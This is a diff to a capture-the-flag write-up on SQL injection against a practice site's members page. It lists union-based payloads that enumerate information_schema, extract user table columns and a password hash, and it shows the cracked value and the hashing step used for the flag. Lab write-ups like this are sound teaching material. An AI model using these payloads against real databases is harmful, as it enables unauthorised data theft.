@@ -1,6 +1,7 @@
 # Member SQL Injection - Users
 
 ## Vulnerability Type
+
 **OWASP A03:2021 - Injection** (CWE-89: Improper Neutralization of Special Elements used in an SQL Command)
 
 ## Summary
@@ -12,8 +13,9 @@ commands:
 1 OR 1=1
 1 ORDER BY 2
 1 UNION SELECT 1, database()
-1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()
+-- 1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()
 1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=0x7573657273
+1 union select first_name, commentaire from users
 1 UNION SELECT first_name, countersign FROM users
 ```
 
@@ -21,8 +23,19 @@ get teh hex for users on the terminal:
 ```bash
 echo -n "users" | xxd -p
 ```
-
+Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Found MD5 hash: `5ff9d0165b4f92b14994e5c685cdce28` → cracks to `FortyTwo`
+
+```bash 
+echo -n "fortytwo" | shasum -a 256
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  
+```
+
+You know column_name is correct because column_name is a hardcoded, universal system column name built directly into MySQL itself. It is not something the CTF creator invented, and it never changes from database to database.
+
+Every MySQL server in the world has a master system database called information_schema. Inside that database is a built-in table called columns.
+
+MySQL strictly defines the layout of that columns table. The column that holds the names of all other tables' columns is always literally named column_name.
 
 ## The members page
 
@@ -126,7 +139,6 @@ SELECT first_name, last_name FROM users WHERE user_id =
 ```
 
 But this doesnt work, because in that specific query, users needs to be treated as a string value, not as an identifier. We need to use `'users'`
-
 
 ```txt
 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT 1, column' at line 1
